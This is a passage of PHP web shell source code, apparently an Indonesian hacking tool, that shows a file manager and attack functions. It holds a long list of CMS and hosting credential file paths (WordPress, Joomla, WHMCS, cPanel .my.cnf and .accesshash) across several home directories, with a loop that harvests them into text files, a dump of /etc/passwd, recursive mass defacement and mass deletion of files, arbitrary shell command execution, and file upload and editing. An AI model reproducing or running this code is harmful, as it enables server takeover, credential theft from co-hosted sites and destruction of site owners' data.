                    "/home1/$user_chonx/public_html/blogs/configuration.php" => "JoomlaBlogs",
                    "/home1/$user_chonx/public_html/beta/configuration.php" => "JoomlaBeta",
                    "/home1/$user_chonx/public_html/Beta/configuration.php" => "JoomlaBeta",
                    "/home1/$user_chonx/public_html/BETA/configuration.php" => "JoomlaBeta",
                    "/home1/$user_chonx/public_html/PRESS/configuration.php" => "JoomlaPress",
                    "/home1/$user_chonx/public_html/Press/configuration.php" => "JoomlaPress",
                    "/home1/$user_chonx/public_html/press/configuration.php" => "JoomlaPress",
                    "/home1/$user_chonx/public_html/Wp/configuration.php" => "JoomlaWp",
                    "/home1/$user_chonx/public_html/wp/configuration.php" => "JoomlaWp",
                    "/home1/$user_chonx/public_html/WP/configuration.php" => "JoomlaWP",
                    "/home1/$user_chonx/public_html/portal/configuration.php" => "JoomlaPortal",
                    "/home1/$user_chonx/public_html/PORTAL/configuration.php" => "JoomlaPortal",
                    "/home1/$user_chonx/public_html/Portal/configuration.php" => "JoomlaPortal",                    
                    "/home1/$user_chonx/public_html/wp-config.php" => "WordPress",
                    "/home1/$user_chonx/public_html/wordpress/wp-config.php" => "WordPressWordpress",
                    "/home1/$user_chonx/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
                    "/home1/$user_chonx/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",       
                    "/home1/$user_chonx/public_html/Home/wp-config.php" => "WordPressHome",
                    "/home1/$user_chonx/public_html/HOME/wp-config.php" => "WordPressHome",
                    "/home1/$user_chonx/public_html/home/wp-config.php" => "WordPressHome",
                    "/home1/$user_chonx/public_html/NEW/wp-config.php" => "WordPressNew",
                    "/home1/$user_chonx/public_html/New/wp-config.php" => "WordPressNew",
                    "/home1/$user_chonx/public_html/new/wp-config.php" => "WordPressNew",
                    "/home1/$user_chonx/public_html/News/wp-config.php" => "WordPressNews",
                    "/home1/$user_chonx/public_html/NEWS/wp-config.php" => "WordPressNews",
                    "/home1/$user_chonx/public_html/news/wp-config.php" => "WordPressNews",
                    "/home1/$user_chonx/public_html/Cms/wp-config.php" => "WordPressCms",
                    "/home1/$user_chonx/public_html/CMS/wp-config.php" => "WordPressCms",
                    "/home1/$user_chonx/public_html/cms/wp-config.php" => "WordPressCms",
                    "/home1/$user_chonx/public_html/Main/wp-config.php" => "WordPressMain",
                    "/home1/$user_chonx/public_html/MAIN/wp-config.php" => "WordPressMain",
                    "/home1/$user_chonx/public_html/main/wp-config.php" => "WordPressMain",
                    "/home1/$user_chonx/public_html/Blog/wp-config.php" => "WordPressBlog",
                    "/home1/$user_chonx/public_html/BLOG/wp-config.php" => "WordPressBlog",
                    "/home1/$user_chonx/public_html/blog/wp-config.php" => "WordPressBlog",
                    "/home1/$user_chonx/public_html/Blogs/wp-config.php" => "WordPressBlogs",
                    "/home1/$user_chonx/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
                    "/home1/$user_chonx/public_html/blogs/wp-config.php" => "WordPressBlogs",
                    "/home1/$user_chonx/public_html/beta/wp-config.php" => "WordPressBeta",
                    "/home1/$user_chonx/public_html/Beta/wp-config.php" => "WordPressBeta",
                    "/home1/$user_chonx/public_html/BETA/wp-config.php" => "WordPressBeta",
                    "/home1/$user_chonx/public_html/PRESS/wp-config.php" => "WordPressPress",
                    "/home1/$user_chonx/public_html/Press/wp-config.php" => "WordPressPress",
                    "/home1/$user_chonx/public_html/press/wp-config.php" => "WordPressPress",
                    "/home1/$user_chonx/public_html/Wp/wp-config.php" => "WordPressWp",
                    "/home1/$user_chonx/public_html/wp/wp-config.php" => "WordPressWp",
                    "/home1/$user_chonx/public_html/WP/wp-config.php" => "WordPressWP",
                    "/home1/$user_chonx/public_html/portal/wp-config.php" => "WordPressPortal",
                    "/home1/$user_chonx/public_html/PORTAL/wp-config.php" => "WordPressPortal",
                    "/home1/$user_chonx/public_html/Portal/wp-config.php" => "WordPressPortal",
                                        "/home2/$user_chonx/.my.cnf" => "cpanel",
                    "/home2/$user_chonx/.accesshash" => "WHM-accesshash",
                    "/home2/$user_chonx/public_html/bw-configs/config.ini" => "BosWeb",
                    "/home2/$user_chonx/public_html/config/koneksi.php" => "Lokomedia",
                    "/home2/$user_chonx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                    "/home2/$user_chonx/public_html/clientarea/configuration.php" => "WHMCS",               
                    "/home2/$user_chonx/public_html/whmcs/configuration.php" => "WHMCS",
                    "/home2/$user_chonx/public_html/forum/config.php" => "phpBB",
                    "/home2/$user_chonx/public_html/sites/default/settings.php" => "Drupal",
                    "/home2/$user_chonx/public_html/config/settings.inc.php" => "PrestaShop",
                    "/home2/$user_chonx/public_html/app/etc/local.xml" => "Magento",
                    "/home2/$user_chonx/public_html/admin/config.php" => "OpenCart",
                    "/home2/$user_chonx/public_html/slconfig.php" => "Sitelok",
                    "/home2/$user_chonx/public_html/application/config/database.php" => "Ellislab",                 
                    "/home2/$user_chonx/public_html/whm/configuration.php" => "WHMCS",
                    "/home2/$user_chonx/public_html/whmc/WHM/configuration.ph" => "WHMC",
                    "/home2/$user_chonx/public_html/central/configuration.php" => "WHM Central",
                    "/home2/$user_chonx/public_html/whm/WHMCS/configuration.php" => "WHMCS",
                    "/home2/$user_chonx/public_html/whm/whmcs/configuration.php" => "WHMCS",
                    "/home2/$user_chonx/public_html/submitticket.php" => "WHMCS",                                       
                    "/home2/$user_chonx/public_html/configuration.php" => "Joomla",                 
                    "/home2/$user_chonx/public_html/Joomla/configuration.php" => "JoomlaJoomla",
                    "/home2/$user_chonx/public_html/joomla/configuration.php" => "JoomlaJoomla",
                    "/home2/$user_chonx/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",        
                    "/home2/$user_chonx/public_html/Home/configuration.php" => "JoomlaHome",
                    "/home2/$user_chonx/public_html/HOME/configuration.php" => "JoomlaHome",
                    "/home2/$user_chonx/public_html/home/configuration.php" => "JoomlaHome",
                    "/home2/$user_chonx/public_html/NEW/configuration.php" => "JoomlaNew",
                    "/home2/$user_chonx/public_html/New/configuration.php" => "JoomlaNew",
                    "/home2/$user_chonx/public_html/new/configuration.php" => "JoomlaNew",
                    "/home2/$user_chonx/public_html/News/configuration.php" => "JoomlaNews",
                    "/home2/$user_chonx/public_html/NEWS/configuration.php" => "JoomlaNews",
                    "/home2/$user_chonx/public_html/news/configuration.php" => "JoomlaNews",
                    "/home2/$user_chonx/public_html/Cms/configuration.php" => "JoomlaCms",
                    "/home2/$user_chonx/public_html/CMS/configuration.php" => "JoomlaCms",
                    "/home2/$user_chonx/public_html/cms/configuration.php" => "JoomlaCms",
                    "/home2/$user_chonx/public_html/Main/configuration.php" => "JoomlaMain",
                    "/home2/$user_chonx/public_html/MAIN/configuration.php" => "JoomlaMain",
                    "/home2/$user_chonx/public_html/main/configuration.php" => "JoomlaMain",
                    "/home2/$user_chonx/public_html/Blog/configuration.php" => "JoomlaBlog",
                    "/home2/$user_chonx/public_html/BLOG/configuration.php" => "JoomlaBlog",
                    "/home2/$user_chonx/public_html/blog/configuration.php" => "JoomlaBlog",
                    "/home2/$user_chonx/public_html/Blogs/configuration.php" => "JoomlaBlogs",
                    "/home2/$user_chonx/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
                    "/home2/$user_chonx/public_html/blogs/configuration.php" => "JoomlaBlogs",
                    "/home2/$user_chonx/public_html/beta/configuration.php" => "JoomlaBeta",
                    "/home2/$user_chonx/public_html/Beta/configuration.php" => "JoomlaBeta",
                    "/home2/$user_chonx/public_html/BETA/configuration.php" => "JoomlaBeta",
                    "/home2/$user_chonx/public_html/PRESS/configuration.php" => "JoomlaPress",
                    "/home2/$user_chonx/public_html/Press/configuration.php" => "JoomlaPress",
                    "/home2/$user_chonx/public_html/press/configuration.php" => "JoomlaPress",
                    "/home2/$user_chonx/public_html/Wp/configuration.php" => "JoomlaWp",
                    "/home2/$user_chonx/public_html/wp/configuration.php" => "JoomlaWp",
                    "/home2/$user_chonx/public_html/WP/configuration.php" => "JoomlaWP",
                    "/home2/$user_chonx/public_html/portal/configuration.php" => "JoomlaPortal",
                    "/home2/$user_chonx/public_html/PORTAL/configuration.php" => "JoomlaPortal",
                    "/home2/$user_chonx/public_html/Portal/configuration.php" => "JoomlaPortal",                    
                    "/home2/$user_chonx/public_html/wp-config.php" => "WordPress",
                    "/home2/$user_chonx/public_html/wordpress/wp-config.php" => "WordPressWordpress",
                    "/home2/$user_chonx/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
                    "/home2/$user_chonx/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",       
                    "/home2/$user_chonx/public_html/Home/wp-config.php" => "WordPressHome",
                    "/home2/$user_chonx/public_html/HOME/wp-config.php" => "WordPressHome",
                    "/home2/$user_chonx/public_html/home/wp-config.php" => "WordPressHome",
                    "/home2/$user_chonx/public_html/NEW/wp-config.php" => "WordPressNew",
                    "/home2/$user_chonx/public_html/New/wp-config.php" => "WordPressNew",
                    "/home2/$user_chonx/public_html/new/wp-config.php" => "WordPressNew",
                    "/home2/$user_chonx/public_html/News/wp-config.php" => "WordPressNews",
                    "/home2/$user_chonx/public_html/NEWS/wp-config.php" => "WordPressNews",
                    "/home2/$user_chonx/public_html/news/wp-config.php" => "WordPressNews",
                    "/home2/$user_chonx/public_html/Cms/wp-config.php" => "WordPressCms",
                    "/home2/$user_chonx/public_html/CMS/wp-config.php" => "WordPressCms",
                    "/home2/$user_chonx/public_html/cms/wp-config.php" => "WordPressCms",
                    "/home2/$user_chonx/public_html/Main/wp-config.php" => "WordPressMain",
                    "/home2/$user_chonx/public_html/MAIN/wp-config.php" => "WordPressMain",
                    "/home2/$user_chonx/public_html/main/wp-config.php" => "WordPressMain",
                    "/home2/$user_chonx/public_html/Blog/wp-config.php" => "WordPressBlog",
                    "/home2/$user_chonx/public_html/BLOG/wp-config.php" => "WordPressBlog",
                    "/home2/$user_chonx/public_html/blog/wp-config.php" => "WordPressBlog",
                    "/home2/$user_chonx/public_html/Blogs/wp-config.php" => "WordPressBlogs",
                    "/home2/$user_chonx/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
                    "/home2/$user_chonx/public_html/blogs/wp-config.php" => "WordPressBlogs",
                    "/home2/$user_chonx/public_html/beta/wp-config.php" => "WordPressBeta",
                    "/home2/$user_chonx/public_html/Beta/wp-config.php" => "WordPressBeta",
                    "/home2/$user_chonx/public_html/BETA/wp-config.php" => "WordPressBeta",
                    "/home2/$user_chonx/public_html/PRESS/wp-config.php" => "WordPressPress",
                    "/home2/$user_chonx/public_html/Press/wp-config.php" => "WordPressPress",
                    "/home2/$user_chonx/public_html/press/wp-config.php" => "WordPressPress",
                    "/home2/$user_chonx/public_html/Wp/wp-config.php" => "WordPressWp",
                    "/home2/$user_chonx/public_html/wp/wp-config.php" => "WordPressWp",
                    "/home2/$user_chonx/public_html/WP/wp-config.php" => "WordPressWP",
                    "/home2/$user_chonx/public_html/portal/wp-config.php" => "WordPressPortal",
                    "/home2/$user_chonx/public_html/PORTAL/wp-config.php" => "WordPressPortal",
                    "/home2/$user_chonx/public_html/Portal/wp-config.php" => "WordPressPortal",
                    "/home3/$user_chonx/.my.cnf" => "cpanel",
                    "/home3/$user_chonx/.accesshash" => "WHM-accesshash",
                    "/home3/$user_chonx/public_html/bw-configs/config.ini" => "BosWeb",
                    "/home3/$user_chonx/public_html/config/koneksi.php" => "Lokomedia",
                    "/home3/$user_chonx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                    "/home3/$user_chonx/public_html/clientarea/configuration.php" => "WHMCS",               
                    "/home3/$user_chonx/public_html/whmcs/configuration.php" => "WHMCS",
                    "/home3/$user_chonx/public_html/forum/config.php" => "phpBB",
                    "/home3/$user_chonx/public_html/sites/default/settings.php" => "Drupal",
                    "/home3/$user_chonx/public_html/config/settings.inc.php" => "PrestaShop",
                    "/home3/$user_chonx/public_html/app/etc/local.xml" => "Magento",
                    "/home3/$user_chonx/public_html/admin/config.php" => "OpenCart",
                    "/home3/$user_chonx/public_html/slconfig.php" => "Sitelok",
                    "/home3/$user_chonx/public_html/application/config/database.php" => "Ellislab",                 
                    "/home3/$user_chonx/public_html/whm/configuration.php" => "WHMCS",
                    "/home3/$user_chonx/public_html/whmc/WHM/configuration.ph" => "WHMC",
                    "/home3/$user_chonx/public_html/central/configuration.php" => "WHM Central",
                    "/home3/$user_chonx/public_html/whm/WHMCS/configuration.php" => "WHMCS",
                    "/home3/$user_chonx/public_html/whm/whmcs/configuration.php" => "WHMCS",
                    "/home3/$user_chonx/public_html/submitticket.php" => "WHMCS",                                       
                    "/home3/$user_chonx/public_html/configuration.php" => "Joomla",                 
                    "/home3/$user_chonx/public_html/Joomla/configuration.php" => "JoomlaJoomla",
                    "/home3/$user_chonx/public_html/joomla/configuration.php" => "JoomlaJoomla",
                    "/home3/$user_chonx/public_html/JOOMLA/configuration.php" => "JoomlaJoomla",        
                    "/home3/$user_chonx/public_html/Home/configuration.php" => "JoomlaHome",
                    "/home3/$user_chonx/public_html/HOME/configuration.php" => "JoomlaHome",
                    "/home3/$user_chonx/public_html/home/configuration.php" => "JoomlaHome",
                    "/home3/$user_chonx/public_html/NEW/configuration.php" => "JoomlaNew",
                    "/home3/$user_chonx/public_html/New/configuration.php" => "JoomlaNew",
                    "/home3/$user_chonx/public_html/new/configuration.php" => "JoomlaNew",
                    "/home3/$user_chonx/public_html/News/configuration.php" => "JoomlaNews",
                    "/home3/$user_chonx/public_html/NEWS/configuration.php" => "JoomlaNews",
                    "/home3/$user_chonx/public_html/news/configuration.php" => "JoomlaNews",
                    "/home3/$user_chonx/public_html/Cms/configuration.php" => "JoomlaCms",
                    "/home3/$user_chonx/public_html/CMS/configuration.php" => "JoomlaCms",
                    "/home3/$user_chonx/public_html/cms/configuration.php" => "JoomlaCms",
                    "/home3/$user_chonx/public_html/Main/configuration.php" => "JoomlaMain",
                    "/home3/$user_chonx/public_html/MAIN/configuration.php" => "JoomlaMain",
                    "/home3/$user_chonx/public_html/main/configuration.php" => "JoomlaMain",
                    "/home3/$user_chonx/public_html/Blog/configuration.php" => "JoomlaBlog",
                    "/home3/$user_chonx/public_html/BLOG/configuration.php" => "JoomlaBlog",
                    "/home3/$user_chonx/public_html/blog/configuration.php" => "JoomlaBlog",
                    "/home3/$user_chonx/public_html/Blogs/configuration.php" => "JoomlaBlogs",
                    "/home3/$user_chonx/public_html/BLOGS/configuration.php" => "JoomlaBlogs",
                    "/home3/$user_chonx/public_html/blogs/configuration.php" => "JoomlaBlogs",
                    "/home3/$user_chonx/public_html/beta/configuration.php" => "JoomlaBeta",
                    "/home3/$user_chonx/public_html/Beta/configuration.php" => "JoomlaBeta",
                    "/home3/$user_chonx/public_html/BETA/configuration.php" => "JoomlaBeta",
                    "/home3/$user_chonx/public_html/PRESS/configuration.php" => "JoomlaPress",
                    "/home3/$user_chonx/public_html/Press/configuration.php" => "JoomlaPress",
                    "/home3/$user_chonx/public_html/press/configuration.php" => "JoomlaPress",
                    "/home3/$user_chonx/public_html/Wp/configuration.php" => "JoomlaWp",
                    "/home3/$user_chonx/public_html/wp/configuration.php" => "JoomlaWp",
                    "/home3/$user_chonx/public_html/WP/configuration.php" => "JoomlaWP",
                    "/home3/$user_chonx/public_html/portal/configuration.php" => "JoomlaPortal",
                    "/home3/$user_chonx/public_html/PORTAL/configuration.php" => "JoomlaPortal",
                    "/home3/$user_chonx/public_html/Portal/configuration.php" => "JoomlaPortal",                    
                    "/home3/$user_chonx/public_html/wp-config.php" => "WordPress",
                    "/home3/$user_chonx/public_html/wordpress/wp-config.php" => "WordPressWordpress",
                    "/home3/$user_chonx/public_html/Wordpress/wp-config.php" => "WordPressWordpress",
                    "/home3/$user_chonx/public_html/WORDPRESS/wp-config.php" => "WordPressWordpress",       
                    "/home3/$user_chonx/public_html/Home/wp-config.php" => "WordPressHome",
                    "/home3/$user_chonx/public_html/HOME/wp-config.php" => "WordPressHome",
                    "/home3/$user_chonx/public_html/home/wp-config.php" => "WordPressHome",
                    "/home3/$user_chonx/public_html/NEW/wp-config.php" => "WordPressNew",
                    "/home3/$user_chonx/public_html/New/wp-config.php" => "WordPressNew",
                    "/home3/$user_chonx/public_html/new/wp-config.php" => "WordPressNew",
                    "/home3/$user_chonx/public_html/News/wp-config.php" => "WordPressNews",
                    "/home3/$user_chonx/public_html/NEWS/wp-config.php" => "WordPressNews",
                    "/home3/$user_chonx/public_html/news/wp-config.php" => "WordPressNews",
                    "/home3/$user_chonx/public_html/Cms/wp-config.php" => "WordPressCms",
                    "/home3/$user_chonx/public_html/CMS/wp-config.php" => "WordPressCms",
                    "/home3/$user_chonx/public_html/cms/wp-config.php" => "WordPressCms",
                    "/home3/$user_chonx/public_html/Main/wp-config.php" => "WordPressMain",
                    "/home3/$user_chonx/public_html/MAIN/wp-config.php" => "WordPressMain",
                    "/home3/$user_chonx/public_html/main/wp-config.php" => "WordPressMain",
                    "/home3/$user_chonx/public_html/Blog/wp-config.php" => "WordPressBlog",
                    "/home3/$user_chonx/public_html/BLOG/wp-config.php" => "WordPressBlog",
                    "/home3/$user_chonx/public_html/blog/wp-config.php" => "WordPressBlog",
                    "/home3/$user_chonx/public_html/Blogs/wp-config.php" => "WordPressBlogs",
                    "/home3/$user_chonx/public_html/BLOGS/wp-config.php" => "WordPressBlogs",
                    "/home3/$user_chonx/public_html/blogs/wp-config.php" => "WordPressBlogs",
                    "/home3/$user_chonx/public_html/beta/wp-config.php" => "WordPressBeta",
                    "/home3/$user_chonx/public_html/Beta/wp-config.php" => "WordPressBeta",
                    "/home3/$user_chonx/public_html/BETA/wp-config.php" => "WordPressBeta",
                    "/home3/$user_chonx/public_html/PRESS/wp-config.php" => "WordPressPress",
                    "/home3/$user_chonx/public_html/Press/wp-config.php" => "WordPressPress",
                    "/home3/$user_chonx/public_html/press/wp-config.php" => "WordPressPress",
                    "/home3/$user_chonx/public_html/Wp/wp-config.php" => "WordPressWp",
                    "/home3/$user_chonx/public_html/wp/wp-config.php" => "WordPressWp",
                    "/home3/$user_chonx/public_html/WP/wp-config.php" => "WordPressWP",
                    "/home3/$user_chonx/public_html/portal/wp-config.php" => "WordPressPortal",
                    "/home3/$user_chonx/public_html/PORTAL/wp-config.php" => "WordPressPortal",
                    "/home3/$user_chonx/public_html/Portal/wp-config.php" => "WordPressPortal"                  
                        );  
                    foreach($grab_config as $config => $nama_config) {
                        $ambil_config = file_get_contents($config);
                        if($ambil_config == '') {
                        } else {
                            $file_config = fopen("radiant_config/$user_chonx-$nama_config.txt","w");
                            fputs($file_config,$ambil_config);
                        }
                    }
                }       
            }
            echo "<center><a href='?dir=$dir/radiant_config'><font color=lime>Done</font></a></center>";
            }else{
                
        echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo file_get_contents('/etc/passwd'); 
        echo "</textarea><br><input type=\"submit\" value=\"SUBMIT\"></td></tr></center>\n";
        }
    }

    echo "</p></div>";
if(isset($_GET['mass_deface'])) {
echo "$_s";
function mass_kabeh($dir,$namafile,$isi_script) {
if(is_writable($dir)) {
	$dira = scandir($dir);
	foreach($dira as $dirb) {
		$dirc = "$dir/$dirb";
		$▚ = $dirc.'/'.$namafile;
		if($dirb === '.') {
			file_put_contents($▚, $isi_script);
		} elseif($dirb === '..') {
			file_put_contents($▚, $isi_script);
		} else {
			if(is_dir($dirc)) {
				if(is_writable($dirc)) {
					echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
					file_put_contents($▚, $isi_script);
					$▟ = mass_kabeh($dirc,$namafile,$isi_script);
					}
				}
			}
		}
	}
}

function mass_biasa($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$▚ = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($▚, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($▚, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namafile<br>";
						file_put_contents($▚, $isi_script);
					}
				}
			}
		}
	}
}
if($_POST['start']) {
	if($_POST['tipe'] == 'massal') {
	mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
	} elseif($_POST['tipe'] == 'biasa') {
	mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
	}
}
echo "
<div class='mb-3'>
	<form method='POST'> Type : 
	<div class='form-check'>
		<input class='form-check-input' type='checkbox' value='biasa' name='tipe' id='flexCheckDefault' checked>
		<label style=color:white; class='form-check-label' for='flexCheckDefault'>Normal</label>
	</div>
	<div class='form-check'>
		<input style=color:white; class='form-check-input' type='checkbox' value='massal' name='tipe' id='flexCheckDefault'>
		<label style=color:white; class='form-check-label' for='flexCheckDefault'>Mass</label>
	</div>
		<i style=color:white; class='bi bi-folder'> Location:</i>
		<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
		<i class='bi bi-file-earmark'></i> File Name:
		<input class='form-control btn-sm' type='text' name='d_file' placeholder='File Name' $_r>
		<i class='bi bi-file-earmark'></i> File contents:
		<textarea class='form-control btn-sm' rows='7' name='script' placeholder=' File contents' $_r></textarea>
		<div class='d-grid gap-2'>
			<input class='btn btn-outline-light btn-sm' type='submit' name='start' value='MASS DEFACE'>
		</div>
	</form>
</div>";
}
if(isset($_GET['mass_delete'])) {
echo "$_s";
function hapus_massal($dir,$namafile) {
if(is_writable($dir)) {
	$dira = scandir($dir);
	foreach($dira as $dirb) {
		$dirc = "$dir/$dirb";
		$▚ = $dirc.'/'.$namafile;
		if($dirb === '.') {
			if(file_exists("$dir/$namafile")) {
				unlink("$dir/$namafile");
			}
		} elseif($dirb === '..') {
			if(file_exists("".dirname($dir)."/$namafile")) {
				unlink("".dirname($dir)."/$namafile");
			}
		} else {
			if(is_dir($dirc)) {
				if(is_writable($dirc)) {
					if(file_exists($▚)) {
						echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
						unlink($▚);
						$▟ = hapus_massal($dirc,$namafile);
						}
					}
				}
			}
		}
	}
}

if($_POST['start']) {
	hapus_massal($_POST['d_dir'], $_POST['d_file']);
}
echo "
<div class='mb-3'>
	<form method='POST'>
		<i class='bi bi-folder'></i> Location:
		<input class='form-control btn-sm' type='text' name='d_dir' value='$dir'>
			<i class='bi bi-file-earmark'></i> Filename:
		<div class='input-group mb-3'>
			<input class='form-control btn-sm' type='text' name='d_file' placeholder='Filename' $_r><br>
		<div class='input-group-append'>
			<input class='btn btn-outline-light btn-sm' type='submit' name='start' value='mass delete'>
		</div>
	</form>
</div>";
}
if(isset($_GET['cmd'])) {
if(!empty($_POST['cmd'])) {
	$cmd = shell_exec($_POST['cmd'].' 2>&1');
}
echo "$_s
<div class='mb-3'>
<form method='POST'>
	<div class='input-group mb-3'>
		<input class='form-control btn-sm' type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8')."' placeholder='whoami' $_r>
		<button class='btn btn-outline-light btn-sm' type='sumbit'><i class='bi bi-arrow-return-right'></i></button>
	</div>
</form>";
if($cmd):
echo '
<div class="container-fluid language-javascript">
	<div class="shell mb-3">
		<pre style="font-size:10px;"><code>'.htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8').'</code></pre>
	</div>
</div>';
elseif(!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):
echo '<b>No results.</b>';endif;
echo '
</div>';
}
if(isset($_GET['phpinfo'])) {
	@ob_start();
	@eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
	echo "<b><pre class='php_info anu'>".substr($buff,$awal,$akhir-$awal)."</pre></b>";
	exit;
}
if(isset($_GET['upload'])) {
echo "$_s";
if(isset($_POST['upl'])){
	$hasil = count($_FILES['file']['name']);
	for($isi=0;$isi<$hasil;$isi++){
		$namafile = $_FILES['file']['name'][$isi];
			$up = @copy($_FILES['file']['tmp_name'][$isi],"$path/".$namafile);
		}
		if($hasil < 2){
			if($up){
			echo "<strong>Upload</strong> $namafile Ok! ".ok()."</div>";
		}else{
		echo '<strong>Upload</strong> fail! '.er().'</div>';
		}
	}else{
	echo "<strong>Upload</strong> $hasil Ok! ".ok()."</div>";
	}
}
echo "
<div class='mb-3'>
	<form method='POST' enctype='multipart/form-data'>
		<div class='input-group mb-3'>
			<input class='form-control form-control-sm' type='file' name='file[]' multiple='' $_r>
			<input class='btn btn-outline-light btn-sm' type='submit' name='upl' value='UPLOAD'>
		</div>
	</form>
</div>";
}
if(isset($_GET['filebaru'])) {
echo "$_s";
if(isset($_POST['bikin'])){
	$name = $_POST['nama_file'];
	$isi_file = $_POST['isi_file'];
	foreach ($name as $nama_file){
		$handle = @fopen("$nama_file", "w");
		if($isi_file){
			$buat = @fwrite($handle, $isi_file);
		} else {
			$buat = $handle;
		}
	}
	if($buat){
		echo "<script>window.location='?path=$path'</script>";
	} else {
		echo '<strong>Create file</strong> fail! '.er().'</div>';
		}
	}
echo "
<div class='mb-3'>
	<form method='POST'>
		<i class='bi bi-file-earmark'></i> Filename:
		<input class='form-control form-control-sm' type='text' name='nama_file[]' placeholder='Filename' $_r>
		<i class='bi bi-file-earmark'></i> File contents:
		<textarea class='form-control form-control-sm' name='isi_file' rows='7' placeholder='File contents' $_r ></textarea>
		<div class='d-grid gap-2'>
			<input class='btn btn-outline-light btn-sm' type='submit' name='bikin' value='Submit'>
		</div>
	</form>
</div>";
}
if(isset($_GET['dirbaru'])) {
echo "$_s";
if(isset($_POST['buat'])){
	$nama = $_POST['nama_dir'];
	foreach ($nama as $nama_dir){
		$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $nama_dir);
		$fd = @mkdir ($folder);
	}
	if($fd){
		echo "<script>window.location='?path=$path'</script>";
	} else {
		echo '<strong>Make dir</strong> fail! '.er().'</div>';
		}
	}
echo "
<div class='mb-3'>
	<form method='POST'>
		<i class='bi bi-folder'></i> Dir name:
		<div class='input-group mb-3'>
			<input class='form-control form-control-sm' type='text' name='nama_dir[]' placeholder='Dir' $_r>
			<input class='btn btn-outline-light btn-sm' type='submit' name='buat' value='Ok'>
		</div>
	</form>
</div>";
	}
}
// akhir tools
if(isset($_GET['filesrc'])){
echo "<br><b>name : </b>".basename($_GET['filesrc']);"</br>";
echo '
<div class="container-fluid language-javascript">
	<div class="shell mb-3">
		<pre style="font-size:12px;"><code>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</code></pre>
	</div>
</div>';
} elseif(isset($_GET['option']) && $_POST['opt'] != 'hapus'){
echo '<br><b>name : </b>'.basename($_POST['path']);'</br>';
// file
if($_POST['opt'] == 'ganti_nama'){
if(isset($_POST['nama_baru'])){
if(rename($_POST['path'],$path.'/'.$_POST['nama_baru'])){
echo "<script>window.location='?path=$path'</script>";
	} else {
echo '<strong>Ok</strong> fail! '.er().'</div>';
}
$_POST['name'] = $_POST['nama_baru'];
}
echo '
<form method="POST">
	<div class="input-group mb-3">
		<input class="form-control form-control-sm" name="nama_baru" type="text" value="'.$_POST['name'].'" />
			<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="hidden" name="opt" value="ganti_nama">
		<input class="btn btn-outline-light btn-sm" type="submit" value="Ok"/>
	</div>
</form>';
} elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<strong>Edit</strong> Ok! '.ok().'</div>';
	} else {
echo '<strong>Edit</strong> fail! '.er().'</div>';
}
fclose($fp);
}
echo '
<div class="mb-3">
	<form method="POST">
		<textarea class="form-control form-control-sm mb-3" rows="7" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea>
			<input type="hidden" name="path" value="'.$_POST['path'].'">
			<input type="hidden" name="opt" value="edit">
		<div class="d-grid gap-2">
			<input class="btn btn-outline-light btn-sm" type="submit" value="Submit"/>
		</div>
	</form>
</div>';
	}
} else {
//hapus dir & file
if(isset($_GET['option']) && $_POST['opt'] == 'hapus'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
	echo "<script>window.location='?path=$path'</script>";
	} else {
	echo '<strong>Delete</strong> fail! '.er().'</div>';
	}
} elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
	echo "<script>window.location='?path=$path'</script>";
	} else {
	echo '<strong>Delete files</strong> fail! '.er().'</div>';
		}
	}
}
$scandir = scandir($path);
$pa = getcwd();
echo '
<div class="table-responsive">
<table style="color:yellow" class="table table-hover table-dark text-light">
<thead>
<tr>
	<td style="color:yellow" class="text-center">NAME</td>
		<td style="color:yellow" class="text-center">LAST EDIT</td>
		<td style="color:yellow" class="text-center">SIZE</td>
		<td style="color:yellow" class="text-center">OWNER<gr>:</gr>DOWNER</td>
		<td style="color:yellow" class="text-center">PERMISSION</td>
	<td style="color:yellow" class="text-center">OPTION</td>
</tr>
</thead>
<tbody style="color:yellow" class="text-nowrap">
<tr>
	<td><i style="color:yellow" class="bi bi-folder2-open"></i><a class="text-decoration-none text-secondary" href="?path='.dirname($dir).'">..</a></td><td></td><td></td><td></td><td></td><td class="text-center">
		<div class="btn-group">
			<a class="btn btn-outline-light btn-sm" href="?filebaru&path='.$dir.'"><i class="bi bi-file-earmark-plus-fill"></i></a>
			<a class="btn btn-outline-light btn-sm" href="?dirbaru&path='.$dir.'"><i class="bi bi-folder-plus"></i></a>
		</div>
	</td>
</tr>';
